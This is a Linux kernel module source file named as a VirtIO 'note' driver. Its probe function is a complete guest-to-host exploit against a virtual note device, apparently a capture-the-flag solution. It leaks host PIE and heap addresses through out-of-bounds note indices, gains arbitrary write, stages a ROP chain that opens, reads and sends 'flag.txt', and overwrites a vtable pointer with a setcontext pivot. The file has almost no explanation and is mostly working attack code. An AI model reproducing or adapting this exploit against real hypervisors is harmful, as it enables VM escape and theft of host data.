#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/virtio.h>
#include <linux/virtio_config.h>
#include <uapi/linux/virtio_config.h>
#include <linux/virtio_ids.h>
#include <linux/scatterlist.h>
#include <asm/io.h>
#include <linux/gfp.h>
#include <linux/signal.h>
#include <linux/device.h>
#include <linux/mutex.h>
#include <linux/pci.h>
#include <linux/interrupt.h>
#include <linux/io.h>
#include <linux/slab.h>
#include <linux/aio.h>


typedef enum {
    virtio_read,
    virtio_write
} operation;
#define NOTE_SZ           0x40
#define N_NOTES           0x10
#define TYPE_VIRTIO_NOTE  "virtio-note-device"

typedef struct req_t {
    unsigned long idx;
    unsigned long addr;
    operation op;
} req_t;

MODULE_LICENSE("GPL");
MODULE_AUTHOR("jl");
MODULE_DESCRIPTION("VirtiIO Driver");

#define VIRTIO_NOTE 42
#define u64 unsigned long long
#define hwaddr u64

struct virtio_device_id id_table[] = {
    {VIRTIO_NOTE, VIRTIO_DEV_ANY_ID},
    {0}   
};

typedef struct {
    struct virtio_device *vdev;
    struct virtqueue *vqueue;
} virtio_note;
static int virtio_probe(struct virtio_device* vd);
static void virtio_remove(struct virtio_device* vd);
static void send_request(virtio_note* vnote, req_t *req);

static struct virtio_driver virtio_drv = {
    .driver.name = KBUILD_MODNAME,
    .driver.owner = THIS_MODULE,
    .id_table = id_table,
    .probe = virtio_probe,
    .remove = virtio_remove
};



static void send_request(virtio_note* vnote, req_t *req){
    struct scatterlist sg;
    unsigned int len;
    sg_init_one(&sg, req, sizeof(req_t));
    if (virtqueue_add_outbuf(vnote->vqueue, &sg, 1, req, GFP_KERNEL)){
        printk(KERN_ALERT "Add outbuf failed\n");
        return;
    }
    virtqueue_kick(vnote->vqueue);

    while (virtqueue_get_buf(vnote->vqueue, &len) == NULL){
        cpu_relax();
    }
}

static int virtio_probe(struct virtio_device *vdev){

    u64 pie, heap, notes, buffer;
    u64 g1, g2, pop_rdi, pop_rsi, pop_rdx, pop_rax, syscall, xchg_edi_eax;
    unsigned char* data;
    unsigned char* data2;
    u64* rop;
    u64* frame;
    printk(KERN_ALERT "Send request at: 0x%llx\n", (u64)send_request);
    printk(KERN_ALERT "Data at: 0x%llx\n", (u64)&data);

    virtio_note* vnote = kmalloc(sizeof(virtio_note), GFP_KERNEL);
    if (vnote == 0){
        printk(KERN_ALERT "[*] Failed to alloc vnote\n");
        return -1;
    }

    vnote->vdev = vdev;
    vnote->vqueue = virtio_find_single_vq(vdev, NULL, "virtio_note_queue");
    if (IS_ERR(vnote->vqueue)){
        return 0;
    }

    printk(KERN_ALERT "Vnote->vqueue: 0x%llx\n", (u64)vnote->vqueue);
    data = kmalloc(NOTE_SZ + 0x10, GFP_KERNEL);
    data2 = kmalloc(NOTE_SZ + 0x10, GFP_KERNEL);
    rop = kmalloc(0x200, GFP_KERNEL);
    frame = kmalloc(0x100, GFP_KERNEL);
    u64 data_gpa = virt_to_phys((volatile void*)data);
    u64 data2_gpa = virt_to_phys((volatile void*)data2);
    printk(KERN_ALERT "Data physical address: 0x%llx\n", data_gpa);
    
    req_t *req = kmalloc(sizeof(req_t), GFP_KERNEL);
    if (!req){
        printk(KERN_ALERT "Failed to kmalloc request\n");
        return -1;
    }

    req->addr = data_gpa;
    req->idx = 104;
    req->op = virtio_read;
    send_request(vnote, req);
    pie = *(u64*)((char*)data + 8) - 0x1ce4020;
    printk(KERN_ALERT "PIE: 0x%llx\n", pie);
    
    req->addr = data_gpa; 
    req->idx = 0x6e;
    req->op = virtio_read;
    heap = pie;
    send_request(vnote, req);
    heap = *(u64*)((char*)data);
    notes = heap - 0x4c0;
    printk(KERN_ALERT "Heap: 0x%llx\n", heap);
    printk(KERN_ALERT "Notes: 0x%llx\n", notes);


    g1 = 0x000000000089c3bd + pie; // mov rdx, qword ptr [rdi + 0x10] ; mov rdi, rbx ; call qword ptr [rax + 0x18]
    g2 = 0x00000000009e0634 + pie; // mov rdx, qword ptr [rbx + 0x18] ; mov rdi, rbx ; call qword ptr [rbx + 0x10]
    pop_rax = 0x00000000003a0978 + pie;
    pop_rdi = 0x0000000000320932 + pie;
    pop_rdx = 0x000000000031b6df + pie;
    pop_rsi = 0x0000000000323aaf + pie;
    syscall = 0xbfe552 + pie;
    xchg_edi_eax = 0x000000000037976e + pie;
    buffer = pie + 0x1d11a00;
    u64 setcontext_frame = buffer + 0x300;

    *(u64*)((char*)data + 16) = buffer;
    req->addr = data_gpa;
    req->idx = 0x6e;  
    req->op = virtio_write;
    send_request(vnote, req);
    memcpy(data, "flag.txt", 9);
        
    req->addr = data_gpa;
    req->idx = 142; 
    req->op = virtio_write;
    send_request(vnote, req);
    
    req->addr = data_gpa; 
    req->idx = 0x6e;
    req->op = virtio_read;
    send_request(vnote, req);

    u64 offset = 0;
    rop[offset++] = pop_rax;
    rop[offset++] = 2;
    rop[offset++] = pop_rdi;
    rop[offset++] = buffer;
    rop[offset++] = pop_rsi; 
    rop[offset++] = 0;
    rop[offset++] = pop_rdx;
    rop[offset++] = 0;
    rop[offset++] = syscall;
    rop[offset++] = xchg_edi_eax;
    rop[offset++] = pop_rax;
    rop[offset++] = 0;
    rop[offset++] = pop_rsi;
    rop[offset++] = buffer + 0x300;
    rop[offset++] = pop_rdx;
    rop[offset++] = 0x400;
    rop[offset++] = syscall;
    rop[offset++] = pop_rax;
    rop[offset++] = 40;
    rop[offset++] = pop_rdi;
    rop[offset++] = 1;
    rop[offset++] = syscall;
    u64 rop_gpa = virt_to_phys(rop);

    *(u64*)((char*)data + 16) = buffer + 0x100;
    req->addr = data_gpa;
    req->idx = 0x6e;  
    req->op = virtio_write;
    send_request(vnote, req);

    req->addr = rop_gpa;
    req->idx = 142; 
    req->op = virtio_write;
    send_request(vnote, req);

    *(u64*)((char*)data + 16) = buffer + 0x100 + 0x40;
    req->addr = data_gpa;
    req->idx = 0x6e;  
    req->op = virtio_write;
    send_request(vnote, req);

    req->addr = rop_gpa + 0x40;
    req->idx = 142; 
    req->op = virtio_write;
    send_request(vnote, req);

    *(u64*)((char*)data + 16) = buffer + 0x100 + 0x80;
    req->addr = data_gpa;
    req->idx = 0x6e;  
    req->op = virtio_write;
    send_request(vnote, req);

    req->addr = rop_gpa + 0x80;
    req->idx = 142; 
    req->op = virtio_write;
    send_request(vnote, req);


    *(u64*)((char*)data + 16) = setcontext_frame;
    req->addr = data_gpa;
    req->idx = 0x6e;
    req->op = virtio_write;
    send_request(vnote, req);
    
    frame[0xa0/8] = buffer + 0x100;
    frame[0x98/8] = pop_rdi + 1;
    frame[0xa8/8] = pop_rdi + 1;

    memcpy(data2, frame, 0x40);
    req->addr = data2_gpa;
    req->idx = 142;
    req->op = virtio_write;
    send_request(vnote, req);

    *(u64*)((char*)data + 16) = setcontext_frame + 0x40;
    req->addr = data_gpa;
    req->idx = 0x6e;
    req->op = virtio_write;
    send_request(vnote, req);

    memcpy(data2, (char*)frame + 0x40, 0x40);
    req->addr = data2_gpa;
    req->idx = 142;
    req->op = virtio_write;
    send_request(vnote, req);

    *(u64*)((char*)data + 16) = setcontext_frame + 0x80;
    req->addr = data_gpa;
    req->idx = 0x6e;
    req->op = virtio_write;
    send_request(vnote, req);

    memcpy(data2, (char*)frame + 0x80, 0x40);
    req->addr = data2_gpa;
    req->idx = 142;
    req->op = virtio_write;
    send_request(vnote, req);

    offset = 0;
    u64 handle_req = pie + 0x69f0d0;
    while (1){
        *(u64*)((char*)data + 16) = heap + offset;
        req->addr = data_gpa;
        req->idx = 0x6e;
        req->op = virtio_write;
        send_request(vnote, req);

        req->addr = data2_gpa;
        req->idx = 142;
        req->op = virtio_read;
        send_request(vnote, req);
        
        if (*(u64*)((u64*)data2) == handle_req){
            break;
        }
        offset += 8;

    }
    u64 vtable = heap + offset;
    printk(KERN_ALERT "Offset vtable found: %llu\n", offset);
    u64 opaque = heap - 0x6d0;
    u64 setcontext = pie + 0xcccddd;
    *(u64*)((char*)data + 16) = opaque;

    req->addr = data_gpa;
    req->idx = 0x6e;
    req->op = virtio_write;
    send_request(vnote, req);

    req->addr = data2_gpa;
    req->idx = 142;
    req->op = virtio_read;
    send_request(vnote, req);

    *(u64*)((char*)data2 + 16) = setcontext;
    *(u64*)((char*)data2 + 24) = setcontext_frame;

    req->addr = data2_gpa;
    req->idx = 142;
    req->op = virtio_write;
    send_request(vnote, req);



    req->addr = data2_gpa;
    req->idx = 142;
    req->op = virtio_write;
    send_request(vnote, req);




    *(u64*)((char*)data + 16) = vtable;
    req->addr = data_gpa;
    req->idx = 0x6e;
    req->op = virtio_write;
    send_request(vnote, req);


    req->addr = data2_gpa;
    req->idx = 142;
    req->op = virtio_read;
    send_request(vnote, req);

    *(u64*)((char*)data2) = g2;
    req->addr = data2_gpa;
    req->idx = 142;
    req->op = virtio_write;
    send_request(vnote, req);

    send_request(vnote, req);



    return 0;
    
}

static void virtio_remove(struct virtio_device *vdev){
    printk(KERN_ALERT "Virtio Note removed\n");
    return;
}

static int __init virtio_note_init(void){
    register_virtio_driver(&virtio_drv);
    return 0;
}
static void __exit virtio_note_exit(void){
    unregister_virtio_driver(&virtio_drv);
    return;
}

module_init(virtio_note_init);
module_exit(virtio_note_exit);